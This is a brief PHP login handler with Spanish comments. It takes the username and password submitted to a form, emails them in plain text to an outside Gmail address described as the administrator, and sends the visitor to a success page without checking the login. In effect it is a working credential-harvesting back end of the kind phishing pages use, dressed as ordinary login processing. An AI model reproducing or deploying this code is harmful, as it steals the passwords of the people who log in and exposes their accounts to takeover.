<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Procesar los datos y enviar un correo electrónico al administrador
    $to = "bielcastillobcv@gmail.com";
    $subject = "Nuevo inicio de sesión";
    $message = "Se ha iniciado sesión con:\nUsuario: $username\nContraseña: $password";

    // Utilizar la función mail() para enviar el correo electrónico
    mail($to, $subject, $message);

    // Redirigir al usuario a una página de éxito o realizar otras acciones necesarias
    header("Location: exito.php");
    exit;
}
?>
